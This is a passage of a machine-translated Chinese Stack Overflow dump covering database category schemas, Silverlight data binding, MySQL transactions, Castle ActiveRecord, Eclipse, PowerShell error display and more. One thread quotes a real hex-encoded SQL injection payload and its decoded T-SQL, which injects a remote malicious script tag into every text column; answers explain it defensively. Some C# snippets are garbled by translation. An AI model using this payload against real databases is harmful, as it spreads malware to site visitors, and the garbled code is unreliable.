  WHERE 
    I.item_name = 'MyItem' 
```

如果类别中存在层次结构，则可以使用类别表中的递归关系来表示，例如：

```
CREATE TABLE Category(
  category_id INT NOT NULL, 
  category_name VARCHAR(255) NOT NULL,
  parent_category_id INT NOT NULL REFERENCES Category(category_id)
) 
```

这使事情变得更加复杂，因为您必须使用递归查询来获取类别及其子项的所有记录。一种更简单的方法，如果您只有两个级别的类别，则只需将其作为类别表上的第二个字段，例如：

```
CREATE TABLE Category(
  category_id INT NOT NULL, 
  category_name VARCHAR(255) NOT NULL,
  subcategory_name VARCHAR(255) NULL
) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-12-15T22:54:30.413

如果一个项目可以属于多个类别，那么这些不是“类别”。它们更像是标签。

在您的项目和标签之间使用多对多关系。如果您想要标签的层次结构，那就去吧；但它通常是矫枉过正的，很少增加价值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2010-10-25T09:11:55.293

通常，我发现适用于大多数情况的最佳解决方案就是在您的类别表中使用 parent_id 字段。这样，您只需要一个类别表。如果您愿意，这将支持任意数量的级别或仅支持一个级别（在这种情况下，需要在您的代码中阻止创建第三级类别的能力）。

例如：
`CREATE TABLE category ( id INT NOT NULL AUTO_INCREMENT, parent_id INT NOT NULL DEFAULT '0' name VARCHAR(255) NOT NULL )` 这样更简单。parent_id 为 0 的任何类别都将是您的最高级别。如果您有一个 id 为 1 的类别，并且您创建了一个子类别，那么它的 parent_id 将为 1 等等。

# silverlight - Silverlight 数据绑定 - 将 ValueConverter 绑定到视图模型上的属性

> ID：369971
> 
> 赞同：2
> 
> 时间：2008-12-15T22:47:53.467
> 
> 标签：silverlight, data-binding, mvvm, treeview

假设我有以下 xaml ......

```
<UserControl.Resources>
    <local:ViewModel x:Name="viewModel" />
    <local:LoadChildrenValueConverter x:Name="valueConverter" />
</UserControl.Resources>

<UserControl.DataContext>
    <Binding Source="{StaticResource viewModel}" />
</UserControl.DataContext>

<Grid x:Name="LayoutRoot" Background="White">
    <control:TreeView ItemsSource="{Binding Root}">
        <control:TreeView.ItemTemplate>
            <control:HierarchicalDataTemplate ItemsSource="{Binding Converter={StaticResource valueConverter}}">
                <TextBlock Text="{Binding}" />
            </control:HierarchicalDataTemplate>
        </control:TreeView.ItemTemplate>
    </control:TreeView>
</Grid> 
```

...以及以下代码...

```
使用系统；
使用 System.Collections.ObjectModel；
使用 System.Windows.Data；

命名空间 SilverlightViewModelSpike
{
    公共类视图模型
    {
        公共视图模型（）
        {
            Root = new ObservableCollection() { "Item 1", "Item 2", "Item 3", };
        }

        公共 ObservableCollection 根 { 获取；私人套装；}        
    }

    公共类 LoadChildrenValueConverter : IValueConverter
    {
        public object Convert(object value, Type targetType, object parameter, System.Globalization.CultureInfoculture)
        {
            return new ObservableCollection() { "Item 1", "Item 2", "Item 3", };
        }

        public object ConvertBack(object value, Type targetType, object parameter, System.Globalization.CultureInfoculture)
        {
            抛出新的 NotImplementedException();
        }
    }
}

```

这按预期工作，但感觉错误的是，我需要两个单独的类来获取视图所需的数据（想象一下 ViewModel 和 LoadChildrenValueConverter 从 Web 服务中提取数据而不是返回硬编码数据）。这里有更好的解决方案吗？我在想也许是这样的......

```
使用系统；
使用 System.Collections.ObjectModel；
使用 System.Windows.Data；

命名空间 SilverlightViewModelSpike
{
    公共类视图模型
    {
        公共视图模型（）
        {
            Root = new ObservableCollection() { "Item 1", "Item 2", "Item 3", };
            ValueConverter = new LoadChildrenValueConverter();
        }

        公共 ObservableCollection 根 { 获取；私人套装；}
        公共 LoadChildrenValueConverter ValueConverter { get; 私人套装；}
    }

    公共类 LoadChildrenValueConverter : IValueConverter
    {
        public object Convert(object value, Type targetType, object parameter, System.Globalization.CultureInfoculture)
        {
            return new ObservableCollection() { "Item 1", "Item 2", "Item 3", };
        }

        public object ConvertBack(object value, Type targetType, object parameter, System.Globalization.CultureInfoculture)
        {
            抛出新的 NotImplementedException();
        }
    }
}

```

...但是我无法让这条线工作...

`<control:HierarchicalDataTemplate ItemsSource="{???}"`>

...即使这似乎也不是一个很好的解决方案。有没有人对此有一个很好的干净解决方案？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-16T04:45:12.343

由于您使用 ViewModel 位于实际模型和视图之间，我想知道直接在其中实现 IValueConverter 逻辑是否更容易。有点像：

```
public class ViewModel
{
    public ObservableCollection Root { get; set: }

    public ObservableCollection Children
    {
        get { /* return children items */ }
    }
} 
```

然后你可以简单地直接绑定到你的第二个属性：

```
<control:HierarchicalDataTemplate ItemsSource="{Binding Children}"> 
```

我认为 ViewModel 对象的主要目的是限制从原始模型中获取所需数据所需的“技巧”（例如 IValueConverters）的数量。既然有，那就好好利用吧。

**编辑 1**

...当然，现在我重新阅读了您的帖子，我发现还有更多内容。您正在为“根”集合中的每个项目获取孩子。

如何将 IValueConverter 实现为 ViewModel 本身的静态实例？

```
public class ViewModel : IValueConverter
{ 
    public static readonly IValueConverter ChildrenConverter
        = new LoadChildrenValueConverter();
} 
```

现在你应该可以说：

```
<control:HierarchicalDataTemplate 
    ItemsSource="{Binding Converter={x:Static local:ViewModel.ChildrenConverter}}"> 
```

**编辑 2**

好的，您使用的是 Silverlight，因此您无法使用 {x:Static}。

我能想到的唯一另一个选项是直接在 ViewModel 中实现 IValueConverter，这样您就可以重用一个静态资源而不必声明两个。如果您需要进行不止一种类型的转换，这并不好，但如果您的 ViewModel 非常专注，那么它可以完成这项工作。所以：

```
public class ViewModel : IValueConverter
{
    // move your Convert and ConvertBack methods into here
} 
```

现在你可以这样做：

```
<control:HierarchicalDataTemplate
    ItemsSource="{Binding Converter={StaticResource ViewModel}}"> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2011-06-09T05:35:54.580

抱歉，伙计们，我对您在这里尝试做什么感到有些困惑...无论如何，从标题听起来好像您想将值转换器中的属性转换为值转换器中的属性。首先看看我写的一篇文章，解释你如何做到这一点：http: [//nick-howard.blogspot.com/2011/06/silverlight-4-value-converter.html](http://nick-howard.blogspot.com/2011/06/silverlight-4-value-converter.html)

所以你要做的是在你的 LoadChildrenValueConverter 中创建一个 ObvervableCollection 依赖属性，为了参数，我们称之为 Children。

然后在您的 xaml 中，您可以将 LoadChildrenValueConverter 更改为如下所示：

这样，您只需从您的视图模型中调用一次 Web 服务，然后您就可以在您的视图模型中与您的值转换器共享该 ObvervableCollection。

希望有帮助。

# asp.net - 无法从 MySql/.net 连接器中的同一会话中读取未提交的数据

> ID：369975
> 
> 赞同：0
> 
> 时间：2008-12-15T22:49:36.820
> 
> 标签：asp.net, mysql, transactions

我一直在用这个把头撞在墙上，可能有人可以阐明可能导致这种行为的原因。

我有一个 asp.net (2.0) 应用程序，正如某些点所做的那样：

使用（TransactionScope 范围 = 新的 TransactionScope（...）） {

//... 做一堆查询

插入订单（）；

插入订单详情（）；

// 做更多的逻辑和查询

读订单（）；// 读取新插入的订单 OK

ReadOrderDetails(); // 这是问题所在，我无法阅读新插入的详细信息

// 做更多的插入....

范围。完成（）；

}

更多联系信息：

*   MySql5.0.27 社区
*   MySql/net 连接器 5.2.3
*   Order 和 OrderDetails 是具有 FK 约束的 InnoDB
*   启用轮询（尽管我尝试关闭轮询并且具有相同的行为）
*   我已经尝试在事务中设置不同的隔离级别，以防万一出现相同的行为，但这是相同的连接，所以没关系吧？

有人对可能导致这种情况的原因有任何想法吗？

任何帮助将不胜感激

海梅

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-16T07:06:08.267

我的猜测是您调用的不同函数正在获取不同的连接，因此他们看不到事务中未提交的更改。

一种检查方法是获取连接 ID 并进行比较。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2011-06-17T03:31:26.897

实际上，我对查询做了一件愚蠢的事情，阻止它返回任何结果......与事务或 MySql 无关

# c# - 使用 Castle Active Record 与 Straight NHibernate 的优缺点是什么？

> ID：369978
> 
> 赞同：17
> 
> 时间：2008-12-15T22:53:05.220
> 
> 标签：c#, nhibernate, castle-activerecord

假设编写 nhibernate 映射文件不是一个大问题......或者用属性污染你的域对象也不是一个大问题......

优缺点都有什么？

有什么基本的技术问题吗？什么往往会影响人们的选择？

不太确定所有的权衡是什么。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2008-12-16T10:09:20.160

AR 最大的优点是它为您提供了一个现成的存储库并为您处理会话管理。`ActiveRecordBase<T>`两者中的任何`ActiveRecordMediator<T>`一个都是您最终在 NHibernate 下组装自己的礼物。避免 XML 映射是另一个优点。AR 映射属性使用简单，但足够灵活，甚至可以映射相当“传统”的数据库。

AR 最大的缺点是它积极鼓励你错误地思考 NHibernate。也就是说，因为默认会话管理是每次调用会话，所以您习惯了这样的想法，即持久对象是断开连接的，并且`Save()`在发生更改时必须是 d。这不是 NHibernate 应该如何工作的 - 通常你会拥有每个工作单元或请求或线程的会话，并且对象将在会话的生命周期内保持连接，因此更改会自动持久化。如果您开始使用 AR，然后发现您需要切换到每个请求的会话以使延迟加载工作 - 这在文档中没有很好地解释 - 当您没有预料到的对象时，您会得到一个令人讨厌的惊喜当会话刷新时保存。

请记住，Castle 团队将 AR 编写为 Castle Monorail 的补充产品，Castle Monorail 是一个类似 Rails 的 .NET 框架。它的设计考虑到了这种用途。它不能很好地适应更分层、解耦的设计。

将它用于它的本质，但不要将它视为 NHibernate 的捷径。如果您想使用 NH 但避免映射文件，请使用 NHibernate Attributes 或更好的 Fluent NHibernate。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2008-12-15T23:46:15.550

我发现 ActiveRecord 是一个很好的工具包，非常适合我用过的中小型项目。与 Rails 一样，它会为您做出许多重要决定，从而使您始终专注于问题的实质。

在我看来，优点和缺点是：

**优点**

*   让您专注于手头的问题，因为许多决定都是为您做出的。
*   包括成熟的、非常有用的基础设施类（存储库、验证等）
*   编写 AR 属性比编写 XML 或 NHibernate.Mapping.Attributes 恕我直言更快。
*   良好的文档和社区支持
*   与它一起使用其他 NHibernate 功能相当容易。
*   一个安全的开始。你有一个退出条款。如果您使用 AR 碰壁，您可以慢慢回到定制的 NHibernate 解决方案。
*   非常适合域优先开发（生成数据库）。
*   您可能还想查看[ActiveRecord 模式的优点和缺点](http://martinfowler.com/eaaCatalog/activeRecord.html)

**缺点**

*   你不能假装 NHibernate 不存在——你仍然需要学习它。
*   如果您已经有一个遗留数据库可以使用，则可能不会那么高效。
*   不透明的持久性。
*   内置映射是全面的，但对于*某些*项目，您可能需要在某些地方恢复为 NHibernate 映射。我没有遇到这个问题，只是一个想法。

总的来说，我真的很喜欢 ActiveRecord 并且它总是可以节省时间，主要是因为我似乎很乐意*接受*库中的决策和工具，然后花更多时间专注于手头的问题。

我会在几个项目上试一试，看看你的想法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-15T23:31:07.640

当我开始使用[NHibernate](http://www.nhibernate.org)时，直到我编写了我的映射文件并制作了我的课程，我才了解 Castle ActiveRecord。那时，我无法明显看出 Castle Activerecord 会给我什么，所以我没有使用它。

第二次使用 NHibernate 时，我只是使用[myGeneration](http://www.mygenerationsoftware.com/portal/TheGreatHallofTemplates/tabid/110/Default.aspx)来制作映射文件和类，只需让它查看我的数据库即可。这本身就节省了很多时间，并且让我（再次）不用担心 Castle Active Record。

实际上，您的大部分时间都将花在进行自定义查询上，而 Castle Active Record 不一定会对此有所帮助——如果您将 myGeneration 与 NHibernate 一起使用，您将绕过大部分工作无论如何都需要做。

编辑：我不想看起来像 myGeneration 或 NHibernate 的啦啦队长。我只是使用可以让我快速轻松地完成工作的工具。我花在编写数据访问代码上的时间越少越好。这并不意味着我做不到——但每次编写新应用程序时重新发明轮子没有什么意义。在需要的地方编写 SQL 查询和存储过程，而不要在其他地方编写。如果您正在执行 CRUD 操作，那么 ORM 就是要走的路。

[编辑#2：Castle Active Record 带来的可能比我意识到的更多——除了他们网站上的内容](http://www.castleproject.org/activerecord/index.html)，我不知道太多，但如果它确实带来了更多，那么它将帮助潜在的采用者能够很容易在他们的网站上看到。

# sql-injection - SQL 注入攻击 - 这是怎么回事？

> ID：369981
> 
> 赞同：12
> 
> 时间：2008-12-15T22:54:13.220
> 
> 标签：sql-injection

> **可能重复：**
> [尝试的 SQL 注入攻击 - 他们试图做什么？](https://stackoverflow.com/questions/200545/attempted-sql-injection-attack-what-are-they-trying-to-do)

在过去的几个月里，我多次在我的网站上看到这种 SQL 注入尝试。

```
';DECLARE @S CHAR(4000);SET @S=CAST(0x4445434C415245204054207661726368617228323535292C40432076617263686172283430303029204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756D6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F7220622E78747970653D3335206F7220622E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20657865632827757064617465205B272B40542B275D20736574205B272B40432B275D3D2727223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777322E73383030716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D27272B5B272B40432B275D20776865726520272B40432B27206E6F74206C696B6520272725223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777322E73383030716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D272727294645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 AS CHAR(4000));EXEC(@S); 
```

浏览完我的代码后，我确信我受到了保护，因为我查询的是内存数据集而不是数据库本身。但是，即使我确定自己受到保护，但我并不完全了解这次攻击尝试发生了什么，并想弄清楚，这样我就可以避免将来编写可能容易受到攻击的代码。

谁能向我解释这些黑客试图用这段代码做什么？

谢谢。

- 此代码被附加到查询字符串并作为发布数据发送。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2008-12-15T22:57:22.263

注意：我的第一个解释是不正确的，因为我实际上并没有通读整件事......

这就是翻译的意思。它在您的数据库中搜索 text 或 varchar 列（b.xtype 在 99,35,231,167），然后将 javascript 文件注入到数据库中的所有文本列中。比我最初想象的还要恶意。

```
DECLARE 
    @T varchar(255),
    @C varchar(4000) 

DECLARE Table_Cursor CURSOR FOR 
    select a.name,b.name 
    from sysobjects a,syscolumns b 
    where a.id=b.id and a.xtype='u' and (b.xtype=99 or b.xtype=35 or b.xtype=231 or b.xtype=167) 
OPEN Table_Cursor 
FETCH NEXT 
FROM  Table_Cursor 
INTO @T,@C 

WHILE(@@FETCH_STATUS=0) 
BEGIN exec('update ['+@T+'] set ['+@C+']=''">
    </title>
    <script src="http://www2.s800qn.cn/csrss/w.js"></script>
      <!--''+['+@C+'] where '+@C+' not like ''%">
    </title>
    <script src="http://www2.s800qn.cn/csrss/w.js"></script><!--'
'')
FETCH NEXT FROM  Table_Cursor INTO @T,@C 
END 

CLOSE Table_Cursor 
DEALLOCATE Table_Cursor 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-12-15T23:13:16.037

实际上，Jimmy，如果你分析这段代码，它会使用游标在数据库的每个文本字段中注入对 hxxp://www2.s800qn.cn/csrss/w.js 的 javascript 引用。

这意味着他们不关心您的数据库，他们想要的是使用您的页面从浏览它的用户那里窃取数据。

该 javascript 链接现在已失效，但它可能包含获取用户 cookie 的代码。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-12-15T23:01:48.963

继 Jimmy 的帖子之后：您还可以使用 hex-ascii 翻译器来获得：

```
DECLARE @T varchar(255)'@C varchar(4000) DECLARE Table_Cursor CURSOR  FOR select 
a.name'b.name from sysobjects a'syscolumns b where a.id=b.id and a.xtype='u' and 
(b.xtype=99 or b.xtype=35 or b.xtype=231 or b.xtype=167) OPEN Table_Cursor FETCH NEXT 
FROM  Table_Cursor INTO @T'@C WHILE(@@FETCH_STATUS=0) BEGIN 
exec('update ['+@T+'] set ['+@C+']=''"></title><script src="http://www2.s800qn.cn
/csrs/w.js"></script>''+['+@C+'] where '+@C+' not like ''%"></title><script 
src="http://www2.s800qn.cn/csrss/w.js"></script>''')FETCH NEXT FROM  Table_Cursor INTO 
@T'@C END CLOSE Table_Cursor DEALLOCATE Table_Cursor 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-15T23:17:20.507

如果您还没有发现这是一种没有针对性的**自动攻击，只是为了提供帮助。****包含的 .js 文件**的目的是通过使用您的网站分发恶意软件，其中包含几个主要针对 IE 用户的漏洞利用。

# eclipse - 当前文件上 Eclipse 的自定义命令

> ID：369983
> 
> 赞同：12
> 
> 时间：2008-12-15T22:54:24.733
> 
> 标签：eclipse, eclipse-3.4

我想增强 Eclipse，这样当我按下自定义键组合时——比如`Ctrl`++ ——那么它将在当前文件上运行一个命令（如果我当前的缓冲区是 foo.c 那么它将运行`mycommand `Shift`foo.c `E`' 在 foo.c 的目录中）。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2008-12-15T23:26:47.727

从“运行”菜单打开“外部工具配置”对话框。使用以下设置创建新配置。

**位置**：c:\mycommand.exe（根据您的需要更改）

**工作目录**：${container_loc}

**参数**：${resource_loc}

在 Prefrences->General->Keys 下，您可以设置“运行上次启动的外部工具”的快捷方式。

这应该可以解决您的问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-03-13T23:14:51.127

此外，请确保您的“资源”（foo.c）被选中。我碰巧在测试外部工具并水平滚动输出窗格时，资源被取消选择。当您在对其配置进行更改后再次运行外部工具时，Eclipse 将弹出一个关于“空变量”的错误框（例如 ${resource_loc} ）。

# language-agnostic - 哪些语言的评论不是评论？

> ID：369986
> 
> 赞同：2
> 
> 时间：2008-12-15T22:55:01.300
> 
> 标签：language-agnostic, comments

哪些语言有副作用？本质上，评论**不是**评论......

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-15T22:57:10.487

英语。我赢了吗？

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-26T20:44:16.903

DOS 批处理 Shell 编程

REM（备注）允许您添加评论。但它具有将 ERRORLEVEL 变量修改为 0 的副作用。

从某种意义上说，它使最后一次手术成功了。

我不知道评论是如何失败的，但如果确实如此，你就会被覆盖。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-12-26T21:01:36.103

我可以想到几个评论不是真正评论的地方。

*   HTML 和脚本标签（为不允许或支持脚本的浏览器提供支持）。

然后，更加模糊：

*   IBM Informix 4GL (I4GL) 和 4J 的 Genero（Informix Dynamic 4GL、D4GL 的继任者）。D4GL 使用符号“ `--#`”来包括仅适用于 D4GL 的材料；I4GL 会将其视为评论。反向符号是 ' `--@`'，看起来像是对 D4GL 的注释，但被 I4GL 视为活性材料。

而且，更模糊的是：

*   我利用 I4GL 的多种注释功能编写了一个双语言 I4GL 文件。以“ ”（哈希）开头的材料`#`标记了字符串之外的注释的开始 - 直到下一个换行符，“ `--`”（双破折号）也是如此。此外，' `{...}`'（大括号）包含多行注释。
*   源文件的顶部实际上是一个 shell 脚本，大部分包含在 ' `{...}`' 中，当然这在 shell 中是完全合法的。shell 脚本是一个数据驱动的代码生成器，它将自身复制到输出的顶部，然后生成大约 100 个函数，这些函数都非常相似但略有不同（在没有模板或预处理器的语言中）。代码必须根据来自外部源（实际上是伦敦劳埃德银行）的传入数据验证给定船舶​​的数据库中的内容，以查看自上次接收外部数据以来发生了什么变化。非常重要的比较工作，特别是因为它必须处理数据库 (SQL) 空值。
*   该文件并不是真正的 Quine 程序，但与它有一些共同点。特别是，您可以输入脚本损坏的 I4GL 代码，重新生成的文件将再次完美，主要是因为它忽略了现有的 I4GL 代码。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-15T22:59:15.833

[Haskell 可以通过在注释](http://yav.purely-functional.net/haskell_latex.html)中添加代码（也包括 Mathematica 等）来颠倒代码范例中的常用注释；文字编程对于更倾向于数学的语言来说是一个很好的特性。

我还发现 Java 中的注释就像带有行为的注释。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-02-17T00:44:39.943

当然还有“多语言”——可以用多种语言编译/执行的程序[。](http://en.wikipedia.org/wiki/Polyglot_(computing))通常这些依赖于这样一个事实，即同一行是一种语言的注释，但实际上是另一种语言的代码行。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-05-24T19:30:22.897

QBasic 使用了自己的注释：`REM $STATIC`或`REM $DYNAMIC`设置数组的分配方式。

另一个例子：当网络浏览器解析评论时`<!-- -- -->in<!-- -- -->correctly`。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-15T22:58:16.770

用于聪明的跨浏览器黑客的 CSS。当然，我不会真正称 CSS 为一种语言。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2011-12-16T16:31:18.257

偶然发现了这个老问题，我的第一个想法是 javadoc 评论。

# powershell - 是否可以在 powershell 中自定义错误显示？

> ID：369990
> 
> 赞同：14
> 
> 时间：2008-12-15T22:56:58.147
> 
> 标签：powershell, customization

我发现标准的 Powershell 错误显示（红色文本、多行显示）有点让人分心。可以定制这个吗？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2008-12-15T23:20:59.110

是的，是的。

`$host`如果您只想更改文本颜色，则可以使用内置对象。但是，您不能更改错误消息本身 - 这是硬编码的。

您可以做的是（a）抑制错误消息，而不是（b）捕获错误并显示您自己的错误。

通过设置完成 (a) `$ErrorActionPreference = "SilentlyContinue"`- 这不会停止错误，但会抑制消息。

完成（b）需要更多的工作。默认情况下，大多数 PowerShell 命令不会产生可捕获的异常。因此，您必须学习运行命令并添加 -EA "Stop" 参数以在出现问题时生成可捕获的异常。完成此操作后，您可以通过键入以下内容在 shell 中创建一个陷阱：

```
trap {
 # handle the error here
} 
```

您可以将其放入您的配置文件脚本中，而不是每次都输入它。在陷阱内，您可以使用 Write-Error cmdlet 输出您喜欢的任何错误文本。

可能比你想做的工作更多，但这基本上就是你做你所要求的事情的方式。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2009-02-22T21:25:31.353

这里有一堆东西可以让你自定义你的控制台输出。您可以在个人资料中随意设置这些设置，或制作函数/脚本以针对不同目的进行更改。也许你有时想要一个“不要打扰我”模式，或者在其他人那里想要一个“告诉我一切都错了”。您可以制作一个函数/脚本来在它们之间进行更改。

```
## Change colors of regular text
$Host.UI.RawUI.BackGroundColor = "DarkMagenta"
$Host.UI.RawUI.ForeGroundColor = "DarkYellow" 

## Change colors of special messages (defaults shown)
$Host.PrivateData.DebugBackgroundColor = "Black"
$Host.PrivateData.DebugForegroundColor = "Yellow"
$Host.PrivateData.ErrorBackgroundColor = "Black"
$Host.PrivateData.ErrorForegroundColor = "Red"
$Host.PrivateData.ProgressBackgroundColor = "DarkCyan"
$Host.PrivateData.ProgressForegroundColor = "Yellow"
$Host.PrivateData.VerboseBackgroundColor = "Black"
$Host.PrivateData.VerboseForegroundColor = "Yellow"
$Host.PrivateData.WarningBackgroundColor = "Black"
$Host.PrivateData.WarningForegroundColor = "Yellow"

## Set the format for displaying Exceptions (default shown)
## Set this to "CategoryView" to get less verbose, more structured output
## http://blogs.msdn.com/powershell/archive/2006/06/21/641010.aspx
$ErrorView = "NormalView"

## NOTE: This section is only for PowerShell 1.0, it is not used in PowerShell 2.0 and later
## More control over display of Exceptions (defaults shown), if you want more output
$ReportErrorShowExceptionClass = 0
$ReportErrorShowInnerException = 0
$ReportErrorShowSource = 1
$ReportErrorShowStackTrace = 0

## Set display of special messages (defaults shown)
## http://blogs.msdn.com/powershell/archive/2006/07/04/Use-of-Preference-Variables-to-control-behavior-of-streams.aspx
## http://blogs.msdn.com/powershell/archive/2006/12/15/confirmpreference.aspx
$ConfirmPreference = "High"
$DebugPreference = "SilentlyContinue"
$ErrorActionPreference = "Continue"
$ProgressPreference = "Continue"
$VerbosePreference = "SilentlyContinue"
$WarningPreference = "Continue"
$WhatIfPreference = 0 
```

您还可以在 cmdlet 上使用 -ErrorAction 和 -ErrorVariable 参数来仅影响该 cmdlet 调用。第二个将错误发送到指定的变量而不是默认的 $Error。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2016-10-26T13:17:52.103

这可能是也可能不是您想要的，但是您可以设置一个**$ErrorView**首选项变量：

```
$ErrorView = "CategoryView" 
```

这给出了一个较短的单行错误消息，例如：

```
[PS]> get-item D:\blah
ObjectNotFound: (D:\blah:String) [Get-Item], ItemNotFoundException 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2011-04-13T19:55:25.863

此外，您可以这样做以编写特定的错误文本行：

```
$Host.UI.WriteErrorLine("This is an error") 
```

（克里斯西尔斯的这个答案的道具）

# sql - 将表中所有字段的更改记录到另一个表 (SQL Server 2005)

> ID：369994
> 
> 赞同：8
> 
> 时间：2008-12-15T22:57:35.460
> 
> 标签：sql, sql-server, sql-server-2005, tsql

我想将表中所有字段的更改记录到另一个表中。这将用于保存对该表所做的所有更改的历史记录（您的基本更改日志表）。

在 SQL Server 2005 中执行此操作的最佳方法是什么？

我将假设逻辑将放置在一些触发器中。

什么是循环遍历所有字段以检查更改而不对所有字段进行硬编码的好方法？

正如您从我的问题中看到的那样，示例代码将不胜感激。

我注意到 SQL Server 2008 有一个称为变更数据捕获 (CDC) 的新功能。（这是 CDC 上的一个不错的[Channel9](http://channel9.msdn.com/posts/ashishjaiman/CDC-Change-Data-Capture-SQL-Server-2008/)视频）。这与我们正在寻找的类似，只是我们使用的是 SQL Server 2005，已经有一个日志表布局，并且还在记录进行更改的用户。当一个字段可能发生变化时，我还发现很难证明写出整个记录的前后图像是合理的。

我们当前的日志文件结构有一个字段名称、旧数据、新数据列。

提前致谢，祝您有美好的一天。

**2008 年 12 月 22 日更新：**我做了更多研究，在[Live Search QnA上找到了这两个答案](http://qna.live.com/)

1.  您可以创建一个触发器来执行此操作。请参阅 [如何审核对 sql server 数据](http://web.archive.org/web/20071006100909/http://sqlserver2000.databases.aspfaq.com:80/how-do-i-audit-changes-to-sql-server-data.html)的更改。

2.  您可以使用触发器将数据更改记录到日志表中。您还可以从[www.lumigent.com](http://www.lumigent.com)购买 Log Explorer，并使用它来读取事务日志以查看是哪个用户进行了更改。但是，该选项的数据库需要完全恢复。

**2008 年 12 月 23 日更新：**我还想要一种干净的方法来比较更改的内容，这看起来与 PIVOT 的相反，我在 SQL 中发现它称为 UNPIVOT。我现在倾向于在 INSERTED 和 DELETED 表上使用 UNPIVOT 触发器。我很好奇这是否已经完成，所以我正在搜索“未[透视已删除插入](http://www.google.com/search?hl=en&sa=X&oi=spell&resnum=1&ct=result&cd=1&q=unpivot+deleted+inserted&spell=1)”。

1.  从后触发器发布[使用更新功能](http://social.msdn.microsoft.com/forums/en-US/sqlgetstarted/thread/2910645b-82b2-4dec-8286-553ae5eaa1cc/)有一些不同的想法，但我仍然相信 UNPIVOT 将是要走的路线。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-10-08T09:56:29.840

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-15T23:19:35.493

在 SQL '05 下，您实际上不需要使用触发器。只需看一下 OUTPUT 子句。OUTPUT 适用于插入、更新和删除。

例如：

```
INSERT INTO mytable(description, phone)
OUTPUT INSERTED.description, INSERTED.phone INTO #TempTable
VALUES('blah', '1231231234') 
```

然后您可以使用#TempTable 做任何您想做的事情，例如将这些记录插入到日志表中。

附带说明一下，这是一种获取身份字段值的极其简单的方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-22T16:36:42.617

您可以使用[Log Rescue](http://www.red-gate.com/products/SQL_Log_Rescue/index.htm)。它与 Log Explorer 完全相同，但它是免费的。

它可以查看任何表中每一行的历史记录，包括用户、操作和时间的记录信息。

您可以撤消任何版本的行，而无需将数据库设置为恢复模式。

# asp.net - 管理会话状态

> ID：369995
> 
> 赞同：2
> 
> 时间：2008-12-15T22:57:54.430
> 
> 标签：asp.net, session, session-state, state-server

我需要在数据库中维护会话状态。但是我无法直接从 Web 服务器访问数据库。Web 服务器与应用服务器通信，后者又可以访问数据库。
有没有办法配置这个？或者是否必须编写自定义组件。
此设置的原因是允许负载平衡并允许将用户的会话从一台服务器重定向到另一台服务器。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-15T23:32:22.457

使用 ASP.NET 会话状态服务，您可以直接在您的应用服务器上运行此服务 - 请参阅[此处](http://technet.microsoft.com/en-us/library/cc775821.aspx)的 MSDN 上的注释- 并配置所有 Web 主机以将其用户会话状态存储在该中央状态服务器上。ASP.NET 会话状态服务将会话存储在应用服务器的内存中，并且不需要 SQL Server 数据库。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-12-15T23:12:57.957

请注意，如果您认为由于使用多个 Web 服务器而需要将会话存储在数据库中，那么情况并非如此：您可以使用 StateServer。这意味着您在一台机器上启用会话状态服务并在所有 Web 服务器的 web.config 中设置该机器，以便它们都使用同一台机器作为状态。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-15T23:06:38.390

您唯一的选择是构建自定义组件。

它们实际上并不难做，因为您唯一需要做的就是让浏览器从 cookie 或查询字符串中向您发送一个值。存储的只是名称值对。

请参阅[http://msdn.microsoft.com/en-us/library/aa479034.aspx](http://msdn.microsoft.com/en-us/library/aa479034.aspx)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-15T23:06:25.507

你可以编写一个自定义的 SessionState 提供程序。我认为这是唯一的方法。看看[这里的 MSDN](http://msdn.microsoft.com/en-us/library/aa479034.aspx)。**********